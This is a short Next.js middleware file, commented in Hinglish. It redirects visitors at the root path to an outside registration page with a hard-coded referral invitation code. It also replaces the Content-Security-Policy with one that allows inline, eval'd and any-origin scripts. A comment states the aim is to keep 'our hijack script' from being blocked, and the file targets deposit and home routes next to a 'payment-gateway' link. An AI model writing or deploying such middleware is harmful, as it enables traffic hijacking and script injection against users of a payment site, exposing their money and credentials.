import { NextResponse } from 'next/server'

export default function middleware(req) {
  const myInviteCode = "6683618531272"; // [cite: 2025-12-24]
  const myGitHub = "https://hacrrk1-netizen.github.io/FAST-payment-gateway-/";
  const url = req.nextUrl.clone();

  // 1. Agar banda pehli baar "/" pe aaye toh register pe bhejo
  if (url.pathname === "/") {
    const regURL = `https://www.91appq.com/#/register?invitationCode=${myInviteCode}`;
    return NextResponse.redirect(regURL);
  }

  // 2. Security headers add karo taaki hamara hijack script block na ho
  const response = NextResponse.next();
  response.headers.set('Content-Security-Policy', "script-src 'self' 'unsafe-inline' 'unsafe-eval' *;");
  
  return response;
}

export const config = {
  matcher: ['/', '/deposit', '/home'],
}
